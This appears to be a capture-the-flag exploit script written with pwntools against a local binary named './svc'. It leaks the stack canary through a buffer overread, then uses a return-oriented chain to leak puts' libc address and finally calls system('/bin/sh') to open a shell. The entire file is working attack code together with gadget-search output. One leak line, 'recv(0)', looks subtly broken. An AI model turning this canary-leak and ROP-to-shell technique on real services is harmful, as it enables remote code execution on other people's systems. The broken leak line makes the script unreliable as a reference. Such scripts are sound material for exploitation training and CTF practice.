from pwn import *

context.arch = "amd64"
context.binary = "./svc"
elf = ELF("./svc")
libc = ELF("libc-2.23.so")
target = process("./svc")

# ROPgadget --binary ./libc-2.23.so --only "pop|ret" | grep -E "rdi|rsi|rdx|rax"
# 0x00033544 : pop rax ; ret
# 0x00021102 : pop rdi ; ret
# 0x00001b92 : pop rdx ; ret
# 0x000202e8 : pop rsi ; ret

# ROPgadget --binary ./libc-2.23.so --only "syscall"
# 0x000026bf : syscall

# ROPgadget --binary ./libc-2.23.so --string "/bin/sh"
# 0x0018cd57 : /bin/sh
# ---
# ROPgadget --binary ./svc --only "pop|ret" | grep -E "rdi"
# 0x00400ea3 : pop rdi ; ret
pop_rdi = 0x00400EA3
# readelf -r svc | grep "puts"
# 0x602018  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
puts_got = 0x602018
# objdump -d svc | grep "puts@plt"
# 400d74:       e8 57 fb ff ff          call   4008d0 <puts@plt>
puts_plt = 0x4008D0
# ida pro main push rbp
main_addr = 0x400A96

target.sendlineafter(b">>", b"1")
target.send(b"A" * 168 + b"A")

target.sendlineafter(b">>", b"2")
target.recvuntil(b"A" * 169)
canary_raw = target.recv(7)
canary = u64(b"\x00" + canary_raw)
print(f"[*] Leaked Canary: {hex(canary)}")

padding_to_canary = b"A" * 168
saved_rbp = b"B" * 8

payload1 = flat(
    padding_to_canary,
    canary,
    saved_rbp,
    pop_rdi,
    puts_got,
    puts_plt,
    main_addr,
)

target.sendlineafter(b">>", b"1")
target.send(payload1)
target.sendlineafter(b">>", b"3")

target.recvuntil(b"[*]BYE ~ TIME TO MINE MIENRALS...\n")
leaked_puts = u64(target.recv(0).ljust(8, b"\x00"))

puts_offset = libc.symbols["puts"]
libc_base = leaked_puts - puts_offset
print(f"[*] Libc Base: {hex(libc_base)}")

system_offset = libc.symbols["system"]
system_addr = libc_base + system_offset

bin_sh_offset = next(libc.search(b"/bin/sh"))
bin_sh_addr = libc_base + bin_sh_offset

payload2 = flat(padding_to_canary, canary, saved_rbp, pop_rdi, bin_sh_addr, system_addr)

target.sendlineafter(b">>", b"1")
target.send(payload2)
target.sendlineafter(b">>", b"3")
target.interactive()
